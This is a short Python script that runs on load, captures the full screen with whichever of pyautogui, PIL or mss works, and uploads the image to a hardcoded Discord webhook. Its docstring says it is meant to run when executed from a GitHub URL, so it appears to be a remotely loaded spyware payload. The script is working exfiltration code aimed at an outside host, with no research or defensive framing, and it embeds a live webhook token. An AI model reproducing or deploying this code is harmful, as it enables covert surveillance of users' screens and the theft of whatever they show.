import requests
import io
import tempfile
import os

def take_screenshot():
    """Screenshot function that works when executed from GitHub URL"""
    try:
        # Try multiple methods since we don't know what will work via exec()
        screenshot_data = None
        
        # Method 1: Try pyautogui first
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            screenshot_data = img_bytes.getvalue()
            print("[+] Screenshot taken with pyautogui")
        except:
            pass
        
        # Method 2: Try PIL ImageGrab
        if not screenshot_data:
            try:
                from PIL import ImageGrab
                screenshot = ImageGrab.grab()
                img_bytes = io.BytesIO()
                screenshot.save(img_bytes, format='PNG')
                screenshot_data = img_bytes.getvalue()
                print("[+] Screenshot taken with PIL")
            except:
                pass
        
        # Method 3: Try mss as last resort
        if not screenshot_data:
            try:
                import mss
                with mss.mss() as sct:
                    screenshot = sct.grab(sct.monitors[1])
                    screenshot_data = mss.tools.to_png(screenshot.rgb, screenshot.size)
                print("[+] Screenshot taken with mss")
            except:
                pass
        
        if screenshot_data:
            # Send to Discord webhook
            WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"
            
            files = {
                'file': ('screenshot.png', io.BytesIO(screenshot_data), 'image/png')
            }
            data = {
                'content': '📸 Screenshot captured',
                'username': 'Screenshot Bot'
            }
            
            response = requests.post(WEBHOOK_URL, files=files, data=data)
            
            if response.status_code in [200, 204]:
                print("[+] Screenshot sent to Discord successfully!")
            else:
                print(f"[-] Failed to send: {response.status_code}")
        else:
            print("[-] Could not take screenshot - no working method found")
            
    except Exception as e:
        print(f"[-] Error: {e}")

# Execute immediately when loaded
take_screenshot()
